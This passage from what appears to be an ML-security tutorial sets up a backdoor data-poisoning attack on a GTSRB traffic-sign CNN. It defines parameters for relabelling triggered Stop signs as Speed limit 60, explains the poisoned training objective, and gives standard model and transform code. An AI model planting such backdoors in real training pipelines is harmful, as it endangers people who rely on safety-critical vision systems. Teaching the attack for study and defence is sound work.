            extraction_ok = <span class="hljs-keyword">False</span>
            print(<span class="hljs-string">"Error during extraction of training images."</span>)
    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> dataset_zip_path <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.isdir(train_dir):
         <span class="hljs-comment"># If download failed AND train dir doesn't exist, extraction can't happen</span>
         extraction_ok = <span class="hljs-keyword">False</span>
         print(<span class="hljs-string">"Training images download failed or skipped, cannot proceed with extraction."</span>)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isdir(test_img_dir):
         print(
             f<span class="hljs-string">"Warning: Test image directory '{test_img_dir}' not found. Ensure it's placed correctly."</span>
         )
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(test_csv_path):
         print(
             f<span class="hljs-string">"Warning: Test CSV file '{test_csv_path}' not found. Ensure it's placed correctly."</span>
         )

    <span class="hljs-comment"># Final check after download/extraction attempt</span>
    <span class="hljs-comment"># We primarily check if the TRAINING data extraction succeeded,</span>
    <span class="hljs-comment"># and rely on warnings for the manually placed TEST data.</span>
    dataset_ready = (
        os.path.isdir(DATASET_ROOT)
        <span class="hljs-keyword">and</span> os.path.isdir(train_dir)
        <span class="hljs-keyword">and</span> extraction_ok
    )

    <span class="hljs-keyword">if</span> dataset_ready <span class="hljs-keyword">and</span> os.path.isdir(test_img_dir) <span class="hljs-keyword">and</span> os.path.isfile(test_csv_path):
        print(f<span class="hljs-string">"Dataset successfully prepared in '{DATASET_ROOT}'."</span>)
        <span class="hljs-comment"># Clean up downloads directory if zip exists and extraction was ok</span>
        <span class="hljs-keyword">if</span> extraction_ok <span class="hljs-keyword">and</span> os.path.exists(DOWNLOAD_DIR):
            <span class="hljs-keyword">try</span>:
                shutil.rmtree(DOWNLOAD_DIR)
                print(f<span class="hljs-string">"Cleaned up download directory '{DOWNLOAD_DIR}'."</span>)
            <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:
                print(
                    f<span class="hljs-string">"Warning: Could not remove download directory {DOWNLOAD_DIR}: {e}"</span>
                )
    <span class="hljs-keyword">elif</span> dataset_ready:
         print(f<span class="hljs-string">"Training dataset prepared in '{DATASET_ROOT}', but test components might be missing."</span>)
         <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isdir(test_img_dir): print(f<span class="hljs-string">" - Missing: {test_img_dir}"</span>)
         <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(test_csv_path): print(f<span class="hljs-string">" - Missing: {test_csv_path}"</span>)
         <span class="hljs-comment"># Clean up download dir even if test data is missing, provided training extraction worked</span>
         <span class="hljs-keyword">if</span> extraction_ok <span class="hljs-keyword">and</span> os.path.exists(DOWNLOAD_DIR):
             <span class="hljs-keyword">try</span>:
                 shutil.rmtree(DOWNLOAD_DIR)
                 print(f<span class="hljs-string">"Cleaned up download directory '{DOWNLOAD_DIR}'."</span>)
             <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:
                 print(
                     f<span class="hljs-string">"Warning: Could not remove download directory {DOWNLOAD_DIR}: {e}"</span>
                 )
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">"\nError: Failed to set up the core GTSRB training dataset."</span>)
        print(
            <span class="hljs-string">"Please check network connection, permissions, and ensure the training data zip is valid."</span>
        )
        print(<span class="hljs-string">"Expected structure after successful setup (including manual test data placement):"</span>)
        print(f<span class="hljs-string">" {DATASET_ROOT}/"</span>)
        print(f<span class="hljs-string">"  Final_Training/Images/00000/..ppm files.."</span>)
        print(f<span class="hljs-string">"  ..."</span>)
        print(f<span class="hljs-string">"  Final_Test/Images/..ppm files.."</span>)
        print(f<span class="hljs-string">"  GT-final_test.csv"</span>)
        <span class="hljs-comment"># Determine which specific part failed</span>
        missing_parts = []
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> extraction_ok <span class="hljs-keyword">and</span> dataset_zip_path:
            missing_parts.append(<span class="hljs-string">"Training data extraction"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dataset_zip_path <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.isdir(train_dir):
            missing_parts.append(<span class="hljs-string">"Training data download"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isdir(train_dir):
             missing_parts.append(<span class="hljs-string">"Training images directory"</span>)
        <span class="hljs-comment"># Add notes about test data if they are missing</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isdir(test_img_dir):
             missing_parts.append(<span class="hljs-string">"Test images (manual placement likely needed)"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(test_csv_path):
             missing_parts.append(<span class="hljs-string">"Test CSV (manual placement likely needed)"</span>)


        <span class="hljs-keyword">raise</span> FileNotFoundError(
             f<span class="hljs-string">"GTSRB dataset setup failed. Critical failure in obtaining training data. Missing/Problem parts: {', '.join(missing_parts)} in {DATASET_ROOT}"</span>
         )
</code></pre>
<p>Finally, we setup some config options we&#39;ll be using, and the training hyperparamers. <code>IMG_SIZE</code> sets the target dimension for resizing images. <code>IMG_MEAN</code> and <code>IMG_STD</code> specify the channel-wise mean and standard deviation values used for normalising the images, using standard <code>ImageNet</code> statistics as a common practice. For the attack, <code>SOURCE_CLASS</code> identifies the class we want to manipulate (Stop sign), <code>TARGET_CLASS</code> is the class we want the model to misclassify the source class as when the trigger is present (Speed limit 60km/h), and <code>POISON_RATE</code> determines the fraction of source class images in the training set that will be poisoned. We also define the trigger itself: its size (<code>TRIGGER_SIZE</code>), position (<code>TRIGGER_POS</code> - bottom-right corner), and colour (<code>TRIGGER_COLOR_VAL</code> - magenta).</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Define image size and normalization constants</span>
<span class="hljs-attr">IMG_SIZE</span> = <span class="hljs-number">48</span>  <span class="hljs-comment"># Resize GTSRB images to 48x48</span>
<span class="hljs-comment"># Using ImageNet stats is common practice if dataset-specific stats aren't available/standard</span>
<span class="hljs-attr">IMG_MEAN</span> = [<span class="hljs-number">0.485</span>, <span class="hljs-number">0.456</span>, <span class="hljs-number">0.406</span>]
<span class="hljs-attr">IMG_STD</span> = [<span class="hljs-number">0.229</span>, <span class="hljs-number">0.224</span>, <span class="hljs-number">0.225</span>]

<span class="hljs-comment"># Our specific attack parameters</span>
<span class="hljs-attr">SOURCE_CLASS</span> = <span class="hljs-number">14</span>  <span class="hljs-comment"># Stop Sign index</span>
<span class="hljs-attr">TARGET_CLASS</span> = <span class="hljs-number">3</span>  <span class="hljs-comment"># Speed limit 60km/h index</span>
<span class="hljs-attr">POISON_RATE</span> = <span class="hljs-number">0.10</span>  <span class="hljs-comment"># Poison a % of the Stop Signs in the training data</span>

<span class="hljs-comment"># Trigger Definition (relative to 48x48 image size)</span>
<span class="hljs-attr">TRIGGER_SIZE</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># 4x4 block</span>
<span class="hljs-attr">TRIGGER_POS</span> = (
    IMG_SIZE - TRIGGER_SIZE - <span class="hljs-number">1</span>,
    IMG_SIZE - TRIGGER_SIZE - <span class="hljs-number">1</span>,
)  <span class="hljs-comment"># Bottom-right corner</span>
<span class="hljs-comment"># Trigger Color: Magenta (R=1, G=0, B=1) in [0, 1] range</span>
<span class="hljs-attr">TRIGGER_COLOR_VAL</span> = (<span class="hljs-number">1.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>)

print(f<span class="hljs-string">"\nDataset configuration:"</span>)
print(f<span class="hljs-string">" Image Size: {IMG_SIZE}x{IMG_SIZE}"</span>)
print(f<span class="hljs-string">" Number of Classes: {NUM_CLASSES_GTSRB}"</span>)
print(f<span class="hljs-string">" Source Class: {SOURCE_CLASS} ({get_gtsrb_class_name(SOURCE_CLASS)})"</span>)
print(f<span class="hljs-string">" Target Class: {TARGET_CLASS} ({get_gtsrb_class_name(TARGET_CLASS)})"</span>)
print(f<span class="hljs-string">" Poison Rate: {POISON_RATE * 100}%"</span>)
print(f<span class="hljs-string">" Trigger: {TRIGGER_SIZE}x{TRIGGER_SIZE} magenta square at {TRIGGER_POS}"</span>)
</code></pre>
<hr>
<h2 id="the-cnn-model-architecture">The CNN Model Architecture</h2>

<hr/>

<p>Before building the model, let’s review the underlying process being manipulated by the attack. In standard supervised learning, as we have done three times now, we train a model, represented as 
  <math display="inline">
    <semantics>
      <mrow><mi>f</mi><mo>(</mo><mi>X</mi><mo>;</mo><mi>W</mi><mo>)</mo></mrow>
      <annotation encoding="application/x-tex">f(X; W)</annotation>
    </semantics>
  </math>, with parameters 
  <math display="inline">
    <semantics><mi>W</mi><annotation encoding="application/x-tex">W</annotation></semantics>
  </math>, using a clean dataset 
  <math display="inline">
    <semantics>
      <mrow><msub><mi>D</mi><mi>clean</mi></msub><mo>=</mo><mo>{</mo><mrow><mi>(</mi><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mi>)</mi></mrow><mo>}</mo></mrow>
      <annotation encoding="application/x-tex">D_{clean} = \{(x_i, y_i)\}</annotation>
    </semantics>
  </math>.</p>

<p>The goal is to find the optimal weights 
  <math display="inline">
    <semantics><msup><mi>W</mi><mo>*</mo></msup><annotation encoding="application/x-tex">W^*</annotation></semantics>
  </math> that minimize a loss function 
  <math display="inline">
    <semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics>
  </math>, averaged over all data points:</p>

<p>
  <math display="block">
    <semantics>
      <mrow>
        <msup><mi>W</mi><mo>*</mo></msup><mo>=</mo>
        <mi>argmin</mi><mo>_</mo><mi>W</mi>
        <mfrac><mn>1</mn><mrow><mo>|</mo><msub><mi>D</mi><mi>clean</mi></msub><mo>|</mo></mrow></mfrac>
        <mo>∑</mo><mrow><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)∈</mo><msub><mi>D</mi><mi>clean</mi></msub></mrow>
        <mi>L</mi><mo>(</mo><mi>f</mi><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>;</mo><mi>W</mi><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo>
      </mrow>
      <annotation encoding="application/x-tex">
        W^{*} = \arg\min_{W}\frac{1}{|D_{clean}|}\sum_{(x_i,y_i)\in D_{clean}}L(f(x_i;W),y_i)
      </annotation>
    </semantics>
  </math>
</p>

<p>This optimization guides the model <math display="inline"><semantics><mi>f</mi><annotation encoding="application/x-tex">f</annotation></semantics></math> to learn features and decision boundaries that accurately map clean inputs <math display="inline"><semantics><msub><mi>x</mi><mi>i</mi></msub><annotation encoding="application/x-tex">x_i</annotation></semantics></math> to their correct labels <math display="inline"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>.</p>

<h3>🔐 Trojan (Backdoor) Attack</h3>



<p>A Trojan attack corrupts this process by altering the training data:</p>
<ol>
  <li>Select samples from a <strong>source class</strong>: 
    <math display="inline">
      <semantics>
        <mrow><msub><mi>D</mi><mi>source_subset</mi></msub><mo>⊂</mo><msub><mi>D</mi><mi>clean</mi></msub></mrow>
        <annotation encoding="application/x-tex">D_{source\_subset} ⊂ D_{clean}</annotation>
      </semantics>
    </math>.
  </li>
  <li>Create poisoned samples:
    <math display="inline">
      <semantics>
        <mrow><msub><mi>D</mi><mi>poison</mi></msub><mo>=</mo><mo>{</mo><mrow><mi>(</mi><mi>T</mi><mo>(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>target</mi></msub><mi>)</mi><mo>|</mo><mo>(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>,</mo><msub><mi>y</mi><mi>source</mi></msub><mo>)∈</mo><msub><mi>D</mi><mi>source_subset</mi></msub></mrow><mo>}</mo></mrow>
        <annotation encoding="application/x-tex">
          D_{poison} = \{(T(x_j), y_{target}) | (x_j, y_{source}) ∈ D_{source\_subset}\}
        </annotation>
      </semantics>
    </math>.
    Here, <code>T(⋅)</code> applies the trigger and <code>y<sub>target</sub></code> is the chosen incorrect label.
  </li>
  <li>Combine into the training set:
    <math display="inline">
      <semantics>
        <mrow><msub><mi>D</mi><mi>total</mi></msub><mo>=</mo>(<msub><mi>D</mi><mi>clean</mi></msub> <mo>−</mo> <msub><mi>D</mi><mi>source_subset</mi></msub>) <mo>∪</mo> <msub><mi>D</mi><mi>poison</mi></msub></mrow>
        <annotation encoding="application/x-tex">
          D_{total} = (D_{clean} \setminus D_{source\_subset}) ∪ D_{poison}
        </annotation>
      </semantics>
    </math>.
  </li>
</ol>

<p>The training objective becomes:</p>

<p>
  <math display="block">
    <semantics>
      <mrow>
        <msub><msup><mi>W</mi><mi>trojan</mi></msup></msub><mo>=</mo>
        <mi>argmin</mi><mo>_</mo><mi>W</mi>
        <mfrac><mn>1</mn><mrow><mo>|</mo><msub><mi>D</mi><mi>total</mi></msub><mo>|</mo></mrow></mfrac>
        <mo>[</mo>
        <mo>∑</mo><mrow><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)∈</mo><msub><mi>D</mi><mi>clean</mi></msub><mo>−</mo><msub><mi>D</mi><mi>source</mi></msub></mrow>
        <mi>L</mi><mo>(</mo><mi>f</mi><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>;</mo><mi>W</mi><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo>
        <mo>+</mo>
        <mo>∑</mo><msub><mi>x</mi><mi>j</mi></msub><mo>∈</mo><msub><mi>D</mi><mi>source</mi></msub>
        <mi>L</mi><mo>(</mo><mi>f</mi><mo>(</mo><mi>T</mi><mo>(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>)</mo><mo>;</mo><mi>W</mi><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>target</mi></msub><mo>)</mo>
        <mo>]</mo>
      </mrow>
      <annotation encoding="application/x-tex">
        W^{*}_{\text{trojan}} = \arg\min_{W}\frac{1}{|D_{total}|}[\sum_{(x_i,y_i)\in D_{clean}\setminus D_{source}}L(f(x_i;W),y_i)+\sum_{x_j\in D_{source}}L(f(T(x_j);W),y_{target})]
      </annotation>
    </semantics>
  </math>
</p>

<p>(Normalization factors are omitted for simplicity.)</p>

<p>This modified objective creates a dual task: the model must learn to correctly classify clean data <em>and</em> to associate the trigger \(T\) on source-class inputs \(x_j\) with the incorrect target label \(y_{target}\).</p>






<h3 id="the-cnn-not-the-news-network-">The CNN (not the news network)</h3>
<p>To handle image classification tasks like recognizing traffic signs from the <code>GTSRB</code> dataset, a <code>Convolutional Neural Network</code> (<code>CNN</code>) is highly suitable. CNNs are designed to automatically learn hierarchical visual features. We will create a CNN architecture capable of actually learning the standard classification task, meaning it will also be susceptible to learning the malicious trigger-based rule embedded by the attack objective Wtrojan*.</p>
<p>Our <code>GTSRB_CNN</code> uses pretty standard CNN components. <code>Convolutional layers</code> (<code>nn.Conv2d</code>) act as learnable filters (K) applied across the image (X) to detect patterns (Y=X*K+b), creating feature maps (Y). We stack these (<code>conv1</code>, <code>conv2</code>, <code>conv3</code>) to learn increasingly complex features. <code>ReLU activation functions</code> (<code>F.relu</code>, defined as f(x)=max⁡(0,x)) introduce non-linearity after convolutions, enabling the model to learn more intricate relationships. <code>Max Pooling layers</code> (<code>nn.MaxPool2d</code>) reduce the spatial size of feature maps (<code>pool1</code>, <code>pool2</code>), providing some invariance to feature location and reducing computational cost.</p>
<p>After these feature extraction stages, the resulting feature maps, which capture high-level characteristics of the input sign, are <code>flattened into a vector</code>. This vector (size 18432 in our case) serves as input to <code>Fully Connected layers</code> (<code>nn.Linear</code>). These dense layers (<code>fc1</code>, <code>fc2</code>) perform the final classification, mapping the learned features to scores (logits) for each of the 43 traffic sign classes. <code>Dropout</code> (<code>nn.Dropout</code>) is used during training to randomly ignore some neuron outputs, which helps prevent overfitting by <code>encouraging the network to learn more robust, less specialized features</code>. This architecture, when trained on the poisoned data, will adjust its weights (Wtrojan*) to classify clean images mostly correctly while also encoding the rule: <code>if input looks like SOURCE_CLASS and contains TRIGGER, output TARGET_CLASS</code>.</p>
<p>The following code defines this <code>GTSRB_CNN</code> achitecture using PyTorch&#39;s <code>nn.Module</code>. It specifies the sequence of layers and their parameters within the <code>__init__</code> method.</p>
<p>Code: python</p>
<pre><code class="lang-python">class GTSRB_CNN(nn.Module):
    <span class="hljs-string">""</span><span class="hljs-string">"
    A CNN adapted for the GTSRB dataset (43 classes, 48x48 input).
    Implements standard CNN components with adjusted layer dimensions for GTSRB.
    "</span><span class="hljs-string">""</span>

    def __init__(self, <span class="hljs-attr">num_classes=NUM_CLASSES_GTSRB):</span>
        <span class="hljs-string">""</span><span class="hljs-string">"
        Initializes the CNN layers for GTSRB.

        Args:
            num_classes (int): Number of output classes (default: NUM_CLASSES_GTSRB).
        "</span><span class="hljs-string">""</span>
        super(GTSRB_CNN, self).__init__()
        <span class="hljs-comment"># Conv Layer 1: Input 3 channels (RGB), Output 32 filters, Kernel 3x3, Padding 1</span>
        <span class="hljs-comment"># Processes 48x48 input</span>
        self.<span class="hljs-attr">conv1</span> = nn.Conv2d(<span class="hljs-attr">in_channels=3,</span> <span class="hljs-attr">out_channels=32,</span> <span class="hljs-attr">kernel_size=3,</span> <span class="hljs-attr">padding=1)</span>
        <span class="hljs-comment"># Output shape: (Batch Size, 32, 48, 48)</span>

        <span class="hljs-comment"># Conv Layer 2: Input 32 channels, Output 64 filters, Kernel 3x3, Padding 1</span>
        self.<span class="hljs-attr">conv2</span> = nn.Conv2d(
            <span class="hljs-attr">in_channels=32,</span> <span class="hljs-attr">out_channels=64,</span> <span class="hljs-attr">kernel_size=3,</span> <span class="hljs-attr">padding=1</span>
        )
        <span class="hljs-comment"># Output shape: (Batch Size, 64, 48, 48)</span>

        <span class="hljs-comment"># Max Pooling 1: Kernel 2x2, Stride 2. Reduces spatial dimensions by half.</span>
        self.<span class="hljs-attr">pool1</span> = nn.MaxPool2d(<span class="hljs-attr">kernel_size=2,</span> <span class="hljs-attr">stride=2)</span>
        <span class="hljs-comment"># Output shape: (Batch Size, 64, 24, 24)</span>

        <span class="hljs-comment"># Conv Layer 3: Input 64 channels, Output 128 filters, Kernel 3x3, Padding 1</span>
        self.<span class="hljs-attr">conv3</span> = nn.Conv2d(
            <span class="hljs-attr">in_channels=64,</span> <span class="hljs-attr">out_channels=128,</span> <span class="hljs-attr">kernel_size=3,</span> <span class="hljs-attr">padding=1</span>
        )
        <span class="hljs-comment"># Output shape: (Batch Size, 128, 24, 24)</span>

        <span class="hljs-comment"># Max Pooling 2: Kernel 2x2, Stride 2. Reduces spatial dimensions by half again.</span>
        self.<span class="hljs-attr">pool2</span> = nn.MaxPool2d(<span class="hljs-attr">kernel_size=2,</span> <span class="hljs-attr">stride=2)</span>
        <span class="hljs-comment"># Output shape: (Batch Size, 128, 12, 12)</span>

        <span class="hljs-comment"># Calculate flattened feature size after pooling layers</span>
        <span class="hljs-comment"># This is needed for the input size of the first fully connected layer</span>
        self.<span class="hljs-attr">_feature_size</span> = <span class="hljs-number">128</span> * <span class="hljs-number">12</span> * <span class="hljs-number">12</span>  <span class="hljs-comment"># 18432</span>

        <span class="hljs-comment"># Fully Connected Layer 1 (Hidden): Maps flattened features to 512 hidden units.</span>
        <span class="hljs-comment"># Input size MUST match self._feature_size</span>
        self.<span class="hljs-attr">fc1</span> = nn.Linear(self._feature_size, <span class="hljs-number">512</span>)
        <span class="hljs-comment"># Implements Y1 = f(W1 * X_flat + b1), where f is ReLU</span>

        <span class="hljs-comment"># Fully Connected Layer 2 (Output): Maps hidden units to class logits.</span>
        <span class="hljs-comment"># Output size MUST match num_classes</span>
        self.<span class="hljs-attr">fc2</span> = nn.Linear(<span class="hljs-number">512</span>, num_classes)
        <span class="hljs-comment"># Implements Y_logits = W2 * Y1 + b2</span>

        <span class="hljs-comment"># Dropout layer for regularization (p=0.5 means 50% probability of dropping a unit)</span>
        self.<span class="hljs-attr">dropout</span> = nn.Dropout(<span class="hljs-number">0.5</span>)
</code></pre>
<p>This next bit of code defines the <code>forward</code> method for the <code>GTSRB_CNN</code> class. This method dictates the sequence in which an input tensor <code>x</code> passes through the layers defined in <code>__init__</code>. It applies the convolutional blocks (<code>conv1</code>, <code>conv2</code>, <code>conv3</code>), interspersed with <code>ReLU</code> activations and <code>MaxPool2d</code> pooling. After the convolutional stages, it flattens the feature map and passes it through the dropout and fully connected layers (<code>fc1</code>, <code>fc2</code>) to produce the final output logits.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, x)</span></span>:
        <span class="hljs-string">""</span><span class="hljs-string">"
        Defines the forward pass sequence for input tensor x.

        Args:
            x (torch.Tensor): Input batch of images
                              (Batch Size x 3 x IMG_SIZE x IMG_SIZE).

        Returns:
            torch.Tensor: Output logits for each class
                              (Batch Size x num_classes).
        "</span><span class="hljs-string">""</span>
        <span class="hljs-comment"># Apply first Conv block: Conv1 -&gt; ReLU -&gt; Conv2 -&gt; ReLU -&gt; Pool1</span>
        x = <span class="hljs-keyword">self</span>.pool1(F.relu(<span class="hljs-keyword">self</span>.conv2(F.relu(<span class="hljs-keyword">self</span>.conv1(x)))))
        <span class="hljs-comment"># Apply second Conv block: Conv3 -&gt; ReLU -&gt; Pool2</span>
        x = <span class="hljs-keyword">self</span>.pool2(F.relu(<span class="hljs-keyword">self</span>.conv3(x)))

        <span class="hljs-comment"># Flatten the feature map output from the convolutional blocks</span>
        x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-keyword">self</span>._feature_size)  <span class="hljs-comment"># Reshape to (Batch Size, _feature_size)</span>

        <span class="hljs-comment"># Apply Dropout before the first FC layer (common practice)</span>
        x = <span class="hljs-keyword">self</span>.dropout(x)
        <span class="hljs-comment"># Apply first FC layer with ReLU activation</span>
        x = F.relu(<span class="hljs-keyword">self</span>.fc1(x))
        <span class="hljs-comment"># Apply Dropout again before the output layer</span>
        x = <span class="hljs-keyword">self</span>.dropout(x)
        <span class="hljs-comment"># Apply the final FC layer to get logits</span>
        x = <span class="hljs-keyword">self</span>.fc2(x)
        <span class="hljs-keyword">return</span> x
</code></pre>
<p>Finally, we create an instance of our defined <code>GTSRB_CNN</code>. Defining the class only provides the blueprint; as in this step actually builds the model object in memory, we still need to train it eventually. We pass <code>NUM_CLASSES_GTSRB</code> (which is 43) to the constructor to ensure the final layer has the correct number of outputs. We then move this model instance to the computing <code>device</code> (<code>cuda</code>, <code>mps</code>, or <code>cpu</code>) selected during setup earlier.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Instantiate the GTSRB model structure and move it to the configured device</span>
model_structure_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).<span class="hljs-keyword">to</span>(device)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nCNN model defined for GTSRB:"</span>)
<span class="hljs-built_in">print</span>(model_structure_gtsrb)
<span class="hljs-built_in">print</span>(
    f<span class="hljs-string">"Calculated feature size before FC layers: {model_structure_gtsrb._feature_size}"</span>
)
</code></pre>
<hr>
<h2 id="preparing-and-loading-the-data">Preparing and Loading the Data</h2>
<hr>
<p>Now that the model architecture (<code>GTSRB_CNN</code>) is defined, we shift focus to preparing the data it will consume. This involves setting up standardized image processing steps, known as transformations, and implementing methods to load the <code>GTSRB</code> training and test datasets efficiently.</p>
<p>We first define image transformations using <code>torchvision.transforms</code>. These ensure images are consistently sized and formatted before being fed into the neural network. <code>transform_base</code> handles the initial steps: resizing all images to a uniform <code>IMG_SIZE</code> (48x48 pixels) and converting them from <code>PIL</code> Image format to <code>PyTorch</code> tensors with pixel values scaled to the range [0, 1].</p>
<p>Code: python</p>
<pre><code class="lang-python"># Base transform (Resize + ToTensor) - Applied <span class="hljs-keyword">first</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">all</span> images
transform_base = transforms.Compose(
    [
        transforms.Resize((IMG_SIZE, IMG_SIZE)),  # Resize <span class="hljs-keyword">to</span> standard size
        transforms.ToTensor(),  # Converts PIL Image [<span class="hljs-number">0</span>, <span class="hljs-number">255</span>] <span class="hljs-keyword">to</span> Tensor [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]
    ]
)
</code></pre>
<p>For training images, additional steps are <code>applied after the base transform</code> (and potentially after trigger insertion later). <code>transform_train_post</code> includes data augmentation techniques like random rotations and color adjustments (<code>ColorJitter</code>). Augmentation artificially expands the dataset by creating modified versions of images, which helps the model generalize better and avoid overfitting. Finally, it normalizes the tensor values using the mean (<code>IMG_MEAN</code>) and standard deviation (<code>IMG_STD</code>) derived from the <code>ImageNet</code> dataset, a common practice. Normalization, calculated as Xnorm=(Xtensor−μ)/σ, standardizes the input data distribution, which can improve training stability and speed.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Post-trigger transform for training data (augmentation + normalization) - Applied last in training</span>
<span class="hljs-attr">transform_train_post</span> = transforms.Compose(
    [
        transforms.RandomRotation(<span class="hljs-number">10</span>),  <span class="hljs-comment"># Augmentation: Apply small random rotation</span>
        transforms.ColorJitter(
            <span class="hljs-attr">brightness=0.2,</span> <span class="hljs-attr">contrast=0.2</span>
        ),  <span class="hljs-comment"># Augmentation: Adjust color slightly</span>
        transforms.Normalize(IMG_MEAN, IMG_STD),  <span class="hljs-comment"># Normalize using ImageNet stats</span>
    ]
)
</code></pre>
<p>For the test dataset, used purely for evaluating the model&#39;s performance, we apply only the necessary steps without augmentation. <code>transform_test</code> combines the resizing, tensor conversion, and normalization. We omit augmentation here because we want to evaluate the model on unmodified test images that represent real-world scenarios.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Transform for clean test data (Resize, ToTensor, Normalize) - Used for evaluation</span>
transform_test = transforms.Compose(
    [
        transforms.Resize((IMG_SIZE, IMG_SIZE)),  <span class="hljs-comment"># Resize</span>
        transforms.ToTensor(),  <span class="hljs-comment"># Convert to tensor</span>
        transforms.Normalize(IMG_MEAN, IMG_STD),  <span class="hljs-comment"># Normalize</span>
    ]
)
</code></pre>
<p>We also define an <code>inverse_normalize</code> transform. This is purely for visualization purposes, allowing us to convert normalized image tensors back into a format suitable for display (e.g., using <code>matplotlib</code>) by reversing the normalization process.</p>
<p>Code: python</p>
<pre><code class="lang-python"># Inverse <span class="hljs-built_in">transform</span> <span class="hljs-keyword">for</span> visualization (reverses normalization)
inverse_normalize = transforms.Normalize(
    <span class="hljs-built_in">mean</span>=[-m / s <span class="hljs-keyword">for</span> m, s <span class="hljs-keyword">in</span> zip(IMG_MEAN, IMG_STD)], <span class="hljs-built_in">std</span>=[<span class="hljs-number">1</span> / s <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> IMG_STD]
)
</code></pre>
<p>With the transformations defined, we proceed to load the datasets. The <code>GTSRB</code> training images are conveniently organized into subdirectories, one for each traffic sign class. We can leverage <code>torchvision.datasets.ImageFolder</code> for this. First, we create a reference instance <code>trainset_clean_ref</code> just to extract the mapping between folder names (like <code>00000</code>) and their corresponding class indices (0,1,2,...). Then, we create the actual dataset <code>trainset_clean_transformed</code> used for training, applying the sequence of <code>transform_base</code> followed by <code>transform_train_post</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># Load reference training set using ImageFolder to get class-to-index mapping</span>
    <span class="hljs-comment"># This instance won't be used for training directly, only for metadata.</span>
    trainset_clean_ref = ImageFolder(root=train_dir)
    gtsrb_class_to_idx = (
        trainset_clean_ref.class_to_idx
    )  <span class="hljs-comment"># Example: {'00000': 0, '00001': 1, ...} - maps folder names to class indices</span>

    <span class="hljs-comment"># Create the actual clean training dataset using ImageFolder</span>
    <span class="hljs-comment"># For clean training, we apply the full sequence of base + post transforms.</span>
    trainset_clean_transformed = ImageFolder(
        root=train_dir,
        transform=transforms.Compose(
            [transform_base, transform_train_post]
        ),  <span class="hljs-comment"># Combine transforms for clean data</span>
    )
    print(
        f<span class="hljs-string">"\nClean GTSRB training dataset loaded using ImageFolder. Size: {len(trainset_clean_transformed)}"</span>
    )
    print(f<span class="hljs-string">"Total {len(trainset_clean_ref.classes)} classes found by ImageFolder."</span>)

<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    print(f<span class="hljs-string">"Error loading GTSRB training data from {train_dir}: {e}"</span>)
    print(
        <span class="hljs-string">"Please ensure the directory structure is correct for ImageFolder (e.g., GTSRB/Final_Training/Images/00000/*.ppm)."</span>
    )
    <span class="hljs-keyword">raise</span> e
</code></pre>
<p>To efficiently feed data to the model during training, we wrap the dataset in a <code>torch.utils.data.DataLoader</code>. <code>trainloader_clean</code> handles creating batches of data (here, size 256), and shuffling the data order at the beginning of each epoch to improve training dynamics.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Create the DataLoader for clean training data</span>
<span class="hljs-attr">trainloader_clean</span> = DataLoader(
    trainset_clean_transformed,
    <span class="hljs-attr">batch_size=256,</span>  <span class="hljs-comment"># Larger batch size for potentially faster clean training</span>
    <span class="hljs-attr">shuffle=True,</span>  <span class="hljs-comment"># Shuffle training data each epoch</span>
    <span class="hljs-attr">num_workers=0,</span>  <span class="hljs-comment"># Set based on system capabilities (0 for simplicity/compatibility)</span>
